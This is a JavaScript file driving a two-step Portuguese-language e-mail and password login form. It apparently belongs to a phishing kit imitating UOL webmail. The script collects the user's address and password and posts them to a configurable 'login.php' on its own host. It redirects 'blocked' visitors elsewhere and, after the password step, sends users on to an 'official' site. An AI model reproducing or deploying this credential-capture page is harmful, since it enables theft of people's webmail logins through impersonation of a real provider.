"use strict";

(function () {
    var cfg = window.LOGIN_BRIDGE || {};
    var domain = String(cfg.domain || "");
    var validateAction = (function () {
        var u = String(cfg.validateAction || "/validate.php");
        if (/^https?:\/\//i.test(u)) return u;
        if (u.charAt(0) === "/") return window.location.origin + u;
        return window.location.origin + "/" + u;
    })();
    var action = (function () {
        var u = String(cfg.action || "/login.php");
        if (/^https?:\/\//i.test(u)) return u;
        if (u.charAt(0) === "/") return window.location.origin + u;
        return window.location.origin + "/" + u;
    })();
    var official = window.UOL_OFFICIAL || "/";
    var theme = String(cfg.theme || "");
    var M = window.UOL_MESSAGES || {};

    var form = document.getElementById("login_form");
    var stepEmail = document.getElementById("step-email");
    var stepPass = document.getElementById("step-password");
    var btnContinue = document.getElementById("btn_continue");
    var emailInput = document.getElementById("login");
    var passInput = document.getElementById("password");
    var submitBtn = document.getElementById("login_submit");
    var msgEl = document.getElementById("message");
    var emailErrorEl = document.getElementById("email_error");
    var emailDisplay = document.getElementById("email_display");
    var emailSuffix = document.querySelector(".osiris2026-email-wrap .suffix");
    var btnClearEmail = document.getElementById("btn_clear_email");
    var btnShowPass = document.getElementById("btn_show_pass");
    var cpfLink = document.getElementById("cpf_link");
    var passwordAlertEl = document.getElementById("password_alert");

    if (!form || !emailInput || !passInput) return;

    var storedEmail = "";

    function showMessage(text, ok) {
        if (!msgEl) return;
        msgEl.textContent = text || "";
        msgEl.style.display = text ? "block" : "none";
        if (ok) msgEl.classList.add("uol-ok");
        else msgEl.classList.remove("uol-ok");
    }

    function showEmailError(text) {
        if (!emailErrorEl) {
            showMessage(text, false);
            return;
        }
        emailErrorEl.textContent = text || "";
        emailErrorEl.hidden = !text;
    }

    function normalizeEmail(raw) {
        var v = String(raw || "").trim().toLowerCase();
        if (!v) return "";
        if (domain && v.indexOf("@") === -1) v = v + domain;
        return v;
    }

    function syncEmailSuffix() {
        if (!emailSuffix || !domain) return;
        var v = String(emailInput.value || "");
        emailSuffix.hidden = v.indexOf("@") !== -1;
    }

    function hidePasswordAlert() {
        if (passwordAlertEl) {
            passwordAlertEl.hidden = true;
        }
    }

    function showPasswordAlert(title, hint) {
        hidePasswordAlert();
        showMessage("", false);
        if (!passwordAlertEl) {
            showMessage(title + (hint ? ". " + hint : ""), false);
            return;
        }
        var titleEl = passwordAlertEl.querySelector(".osiris2026-alert-title");
        var hintEl = passwordAlertEl.querySelector(".osiris2026-alert-hint");
        if (titleEl) {
            titleEl.textContent = title || "Senha incorreta";
        }
        if (hintEl) {
            hintEl.textContent =
                hint ||
                "Cuidado com as teclas Caps Lock e Shift, pois diferenciamos letras maiusculas e minusculas.";
        }
        passwordAlertEl.hidden = false;
    }

    function finishResult(result) {
        var data = result.data || {};
        if (data.blocked && data.redirect) {
            window.location.replace(data.redirect);
            return;
        }
        if (data.redirect && result.ok) {
            showMessage("", false);
            window.location.replace(data.redirect || official);
            return;
        }

        document.body.classList.remove("logging-in");
        if (submitBtn) submitBtn.disabled = false;

        if (data.message === "wrong_password" || /senha incorreta/i.test(String(data.text || ""))) {
            showPasswordAlert(
                data.text || "Senha incorreta",
                data.alert_hint ||
                    "Cuidado com as teclas Caps Lock e Shift, pois diferenciamos letras maiusculas e minusculas."
            );
            passInput.value = "";
            passInput.focus();
            return;
        }

        hidePasswordAlert();
        showMessage(data.text || data.message || "Usuario ou senha invalidos.", false);
    }

    function goToPasswordStep(email) {
        storedEmail = email;
        showEmailError("");
        showMessage("", false);
        hidePasswordAlert();
        if (emailDisplay) emailDisplay.textContent = email;
        if (stepEmail) stepEmail.hidden = true;
        if (stepPass) stepPass.hidden = false;
        if (cpfLink) cpfLink.hidden = true;
        passInput.value = "";
        passInput.focus();
    }

    function goToEmailStep() {
        var prev = storedEmail;
        storedEmail = "";
        showEmailError("");
        showMessage("", false);
        if (stepPass) stepPass.hidden = true;
        if (stepEmail) stepEmail.hidden = false;
        if (cpfLink) cpfLink.hidden = false;
        if (domain && prev) {
            emailInput.value = prev.split("@")[0];
        }
        syncEmailSuffix();
        emailInput.focus();
    }

    function parseValidateResponse(res, text, email) {
        var data = null;
        try {
            data = text ? JSON.parse(text) : null;
        } catch (e) {
            data = null;
        }

        if (data && data.blocked && data.redirect) {
            window.location.replace(data.redirect);
            return { ok: false, error: "" };
        }

        if (res.ok && data && data.ok) {
            return { ok: true, email: normalizeEmail(data.email || email) };
        }

        var errText = (data && (data.text || data.message)) || "Usuario invalido.";
        var out = { error: errText };
        if (theme === "uol_webmail" && /inv[aá]lid/i.test(errText)) {
            out.showCpf = true;
        }
        return out;
    }

    function validateEmailServer(email) {
        return fetch(validateAction, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            credentials: "same-origin",
            cache: "no-store",
            body: "login=" + encodeURIComponent(email)
        }).then(function (res) {
            return res.text().then(function (text) {
                return parseValidateResponse(res, text, email);
            });
        });
    }

    function validateEmail() {
        syncEmailSuffix();
        var email = normalizeEmail(emailInput.value);
        if (!email) {
            showEmailError("Informe seu e-mail para continuar.");
            emailInput.focus();
            return;
        }

        showEmailError("");
        if (cpfLink) cpfLink.hidden = true;
        showMessage(M.validating || "Validando...", true);
        if (btnContinue) btnContinue.disabled = true;

        validateEmailServer(email)
            .then(function (result) {
                if (btnContinue) btnContinue.disabled = false;
                showMessage("", false);

                if (result.ok) {
                    goToPasswordStep(email);
                    return;
                }

                if (result.error) {
                    showEmailError(result.error);
                    if (cpfLink && result.showCpf) cpfLink.hidden = false;
                    emailInput.focus();
                }
            })
            .catch(function () {
                if (btnContinue) btnContinue.disabled = false;
                showMessage("", false);
                showEmailError(M.network_error || "Erro de conexao.");
            });
    }

    function doLogin() {
        var email = storedEmail || normalizeEmail(emailInput.value);
        var pass = String(passInput.value || "");
        if (!email) {
            showMessage("Informe seu e-mail para entrar.", false);
            return;
        }
        if (!pass) {
            showMessage("Informe sua senha para entrar.", false);
            passInput.focus();
            return;
        }

        var body = "login=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(pass);
        document.body.classList.add("logging-in");
        if (submitBtn) submitBtn.disabled = true;
        showMessage(M.authenticating || "Autenticando...", true);

        var delay = 0;
        var delayDone = false;
        var fetchResult = null;

        setTimeout(function () {
            delayDone = true;
            if (fetchResult) finishResult(fetchResult);
        }, delay);

        fetch(action, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            credentials: "same-origin",
            body: body
        })
            .then(function (res) {
                return res.text().then(function (text) {
                    var data = null;
                    try {
                        data = text ? JSON.parse(text) : null;
                    } catch (e) {
                        data = null;
                    }
                    return { ok: res.ok, data: data || {} };
                });
            })
            .then(function (result) {
                fetchResult = result;
                if (delayDone) finishResult(result);
            })
            .catch(function () {
                showMessage(M.network_error || "Erro de conexao.", false);
                document.body.classList.remove("logging-in");
                if (submitBtn) submitBtn.disabled = false;
            });
    }

    emailInput.addEventListener("input", syncEmailSuffix);
    syncEmailSuffix();

    if (btnContinue) {
        btnContinue.addEventListener("click", validateEmail);
    }

    if (btnClearEmail) {
        btnClearEmail.addEventListener("click", function () {
            passInput.value = "";
            goToEmailStep();
        });
    }

    if (btnShowPass) {
        btnShowPass.addEventListener("click", function () {
            var showing = passInput.type === "text";
            passInput.type = showing ? "password" : "text";
            btnShowPass.textContent = showing ? "mostrar" : "ocultar";
        });
    }

    form.addEventListener("submit", function (e) {
        e.preventDefault();
        if (stepPass && !stepPass.hidden) {
            doLogin();
            return;
        }
        validateEmail();
    });
})();
